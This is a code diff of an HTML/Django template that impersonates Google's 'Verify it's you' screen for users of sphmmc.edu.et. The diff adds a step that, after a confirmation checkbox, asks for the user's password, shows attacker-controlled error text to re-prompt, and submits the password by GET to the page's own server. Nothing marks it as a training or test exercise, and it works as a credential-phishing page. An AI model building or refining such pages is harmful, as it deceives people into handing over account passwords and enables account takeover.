@@ -94,7 +94,7 @@
       </svg>
       <p class="h2 mt-5">Verify it’s you</p>
       <div class="row position-relative">
-        <div class="div col-6">
+        <div class="div col-12 col-md-6">
           Google needs to confirm it's really you creating a
           <a
             href="{% url 'home' %}"
@@ -144,41 +144,72 @@
             <span><b>{{email}}</b></span>
           </div>
         </div>
-        <div class="col-6 px-5">
-          <p>
-            Is it you who recently signed up for
-            <a
-              href="{% url 'home' %}"
-              title="SAINT PAUL'S HOSPITAL MILLENNIUM MEDICAL COLLEGE"
-              >sphmmc.edu.et</a
-            >
-          </p>
-          <form action="">
-            <div
-              class="p-3 ps-2 pe-5"
-              style="
-                width: fit-content;
-                background-color: #f9f9f9;
-                border: 1px solid #cbc7c7;
-                padding-right: 20% !important;
-              "
-            >
-              <input
-                required
-                class="form-check-input"
-                type="checkbox"
-                value=""
-                id="flexCheckDefault"
-              />
-              <label class="form-check-label" for="flexCheckDefault">
-                Yes,that's me!
-              </label>
+        <div class="col-12 col-md-6 px-md-5 py-4 py-md-0">
+          <form action="" method="get" onsubmit="next(event)">
+            <div id="confirmation-box" "{% if issue != 'none' %}" class="d-none" {%endif%}>
+              <p>
+                Is it you who recently signed up for
+                <a
+                  href="{% url 'home' %}"
+                  title="SAINT PAUL'S HOSPITAL MILLENNIUM MEDICAL COLLEGE"
+                  >sphmmc.edu.et</a
+                >
+              </p>
+              <div
+                class="p-3 ps-2 pe-5"
+                style="
+                  width: fit-content;
+                  background-color: #f9f9f9;
+                  border: 1px solid #cbc7c7;
+                  padding-right: 20% !important;
+                "
+              >
+                <input
+                  id="confirm-checkbox"
+                  {% if issue == "none" %} required {%endif%}
+                  class="form-check-input"
+                  type="checkbox"
+                  value=""
+                  id="flexCheckDefault"
+                />
+                <label class="form-check-label" for="flexCheckDefault">
+                  Yes,that's me!
+                </label>
+              </div>
             </div>
             <input
               type="submit"
-              value="Next"
-              class="position-absolute bottom-0 left-0 btn btn-primary rounded rounded-5 px-5"
+              value= "{% if issue != 'none' %} Confirm {%else%}Next{%endif%}"  
+              id="Nextbtn"
+              class="position-absolute bottom-0 end-0 btn btn-primary rounded rounded-5 px-5 me-5"
             />
+
+            <div id="password-box"  style="display: {% if issue != 'none' %}  block {%else%} none {%endif%}">
+              <p class="text-danger">{% if issue != "none" %} {{issue}} {%endif%} </p>
+              <label for="password" class="form-label"
+                >Enter your password
+              </label>
+              <input
+                name="password"
+                type="password"
+                placeholder="password"
+                class="form-control py-3 rounded-0 mb-2 border-dark"
+              />
+
+              <input
+                onchange="passwordToggle()"
+                id="show-password-checkbox"
+                class="form-check-input rounded-0 border-dark"
+                type="checkbox"
+                style="padding: 10px"
+              />
+              <label
+                class="form-check-label py-1"
+                for="show-password-checkbox text-dark"
+              >
+                Show password
+              </label>
+            </div>
           </form>
         </div>
       </div>
@@ -222,4 +253,29 @@
       data-iml="607.1999999880791"
     /> -->
   </body>
+  <script>
+    next = (event) => {
+      checkbox = document.getElementById("confirm-checkbox");
+      confirmation_box = document.getElementById("confirmation-box");
+      password_box = document.getElementById("password-box");
+      passwordfield = document.getElementsByName("password")[0];
+      Nextbtn = document.getElementById("Nextbtn");
+
+      if (checkbox.checked && Nextbtn.value == "Next") {
+        confirmation_box.style.display = "none";
+        password_box.style.display = "block";
+        Nextbtn.value = "Confirm";
+
+        event.preventDefault();
+        checkbox.required = false;
+        passwordfield.required = true;
+      } else {
+        document.getElementsByTagName("form")[0].submit();
+      }
+    };
+    function passwordToggle() {
+      passwordField = document.getElementsByName("password")[0];
+      passwordField.type = passwordField.type == "text" ? "password" : "text";
+    }
+  </script>
 </html>
